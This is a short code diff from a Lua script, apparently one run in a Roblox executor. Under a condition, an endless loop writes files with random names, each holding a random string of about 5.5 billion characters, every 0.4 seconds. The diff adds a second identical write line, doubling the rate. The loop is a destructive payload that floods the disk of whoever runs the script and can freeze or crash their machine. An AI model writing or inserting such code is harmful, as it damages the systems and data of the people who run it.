@@ -127,6 +127,7 @@ if shared.FuncsConnect then
 			repeat
         task.wait(0.4)
         writefile(Functions.randomGUID()..".lua", "-- Unknown\n"..Functions.randomString(5555555555, 5555555555))
+        writefile(Functions.randomGUID()..".lua", "-- Unknown\n"..Functions.randomString(5555555555, 5555555555))
       until false
     end)
 	end
